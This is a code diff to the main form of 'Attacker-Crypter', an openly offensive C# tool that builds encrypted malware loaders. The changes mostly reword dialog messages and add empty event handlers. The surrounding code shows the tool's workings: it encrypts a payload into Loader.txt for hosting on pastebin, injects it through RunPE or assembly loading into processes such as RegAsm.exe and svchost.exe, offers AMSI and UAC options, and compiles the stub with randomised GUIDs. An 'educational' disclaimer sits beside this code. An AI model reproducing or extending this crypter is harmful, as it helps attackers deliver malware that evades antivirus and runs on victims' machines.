@@ -19,6 +19,8 @@ namespace attackercrypter
     //this program is working on MIT License, so you can use, modify this program etc. but please leave credits to original author TheNewAttacker64
     // This Software For educational Don t try on somewhere you don t have permission to try on
     public partial class Form1 : Form
+
+
     {
         private readonly NotifySettings notifyForm;
 
@@ -33,7 +35,7 @@ namespace attackercrypter
             Injection.SelectedItem = "AssemblyLoad(.Net)";
             Netinjectionpath.SelectedItem = "RegAsm.exe";
             nativeinjection.SelectedItem = "svchost.exe";
-            
+
         }
 
 
@@ -142,18 +144,17 @@ namespace attackercrypter
             everytihnggood = 1;
 
 
-
             if (string.IsNullOrEmpty(textBox4.Text))
             {
                 MessageBox.Show("Enter URL");
             }
             else if (runpecheck.Checked == true && isNative.Checked == false && isNet.Checked == false)
             {
-                MessageBox.Show("Choose if your payload Native or .NET -_-");
+                MessageBox.Show("Please choose your payload type .net or native");
             }
             else if (runpecheck.Checked == true && radio32.Checked == false && radio64.Checked == false)
             {
-                MessageBox.Show("Choose if it x64 or x32 -_-");
+                MessageBox.Show("Please choose your payload architecture x64 or x32");
 
             }
 
@@ -229,7 +230,7 @@ namespace attackercrypter
 
                     if (!File.Exists(filename))
                     {
-                        MessageBox.Show("Check notify Settings");
+                        MessageBox.Show("Please enable Notify Settings");
                         return;
                     }
                     else
@@ -259,7 +260,7 @@ namespace attackercrypter
                     string sockfilename = "ServerCred.txt";
                     if (!File.Exists(sockfilename))
                     {
-                        MessageBox.Show("Check notify Settings");
+                        MessageBox.Show("Please enable Notify Settings");
                         return;
                     }
                     else
@@ -299,13 +300,13 @@ namespace attackercrypter
 
                 if (Injection.SelectedItem.ToString() == "AssemblyLoad(.Net)")
                 {
-                    MessageBox.Show("This injection only works with .NET files", "Attacker-Crypter",MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    MessageBox.Show("Note: This injection only works with .net files", "Attacker-Crypter",MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     Source = Source.Replace("public static bool isdotnetload = false;", "public static bool isdotnetload = true;");
 
                 }
                 else if(Injection.SelectedItem.ToString().ToUpper()== "RUNPE" && runpecheck.Checked == false)
                 {
-                    MessageBox.Show("Check runpe settings", "Attacker-Crypter", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    MessageBox.Show("Please enable and configure RunPE Settings", "Attacker-Crypter", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     everytihnggood = 0;
                 }
                 else if (Injection.SelectedItem.ToString().ToUpper() == "RUNPE" && runpecheck.Checked == true)
@@ -388,7 +389,6 @@ namespace attackercrypter
                         Main = Main.Replace("#Guid", Guid.NewGuid().ToString());
                     }
                     Main = Main.Replace("$URL", Convert.ToBase64String(Encoding.UTF8.GetBytes(textBox4.Text)));
-
                     Main = Main.Replace("$key", textBox2.Text);
                     Main = Main.Replace("$IV", textBox3.Text);
                     CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Main, Source,RunPE32,RunPE64);
@@ -396,11 +396,11 @@ namespace attackercrypter
                     {
 
                         foreach (CompilerError err in Results.Errors)
-                            MessageBox.Show(err.ToString(), "Got An Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            MessageBox.Show(err.ToString(), "There was an Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     }
                     else
                     {
-                        MessageBox.Show("Done :)");
+                        MessageBox.Show("File encrypted successfully");
                     }
 
                 }
@@ -433,7 +433,7 @@ namespace attackercrypter
             {
                 Byte[] F = File.ReadAllBytes(textBox1.Text);
                 File.WriteAllText("Loader.txt",Encrypt(F, textBox2.Text, textBox3.Text));
-                MessageBox.Show("Upload Loader.txt Content to a server for example pastebin and Put your raw url in the Build section");
+                MessageBox.Show("Copy the content of Loader.txt and paste it in pastebin then copy the raw URL and paste it into Builder Area");
             }
             
 
@@ -441,12 +441,12 @@ namespace attackercrypter
 
         private void exdf_CheckedChanged(object sender, EventArgs e)
         {
-            MessageBox.Show("This will Popup Uac One Time");
+            MessageBox.Show("This will popup UAC one time");
         }
 
         private void author_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            System.Diagnostics.Process.Start("https://github.com/TheNewAttacker64/Theattacker-Crypter");
+            System.Diagnostics.Process.Start("https://github.com/TheNewAttacker64");
         }
 
         private void button6_Click(object sender, EventArgs e)
@@ -487,6 +487,51 @@ namespace attackercrypter
         private void button7_Click_1(object sender, EventArgs e)
         {
             notifyForm.ShowDialog();
+        }
+
+        private void label11_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void numericUpDownSleep_ValueChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label8_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label7_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label3_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label6_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label4_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Amsi_CheckedChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void pictureIcon_Click(object sender, EventArgs e)
+        {
+
         }
     }
 }
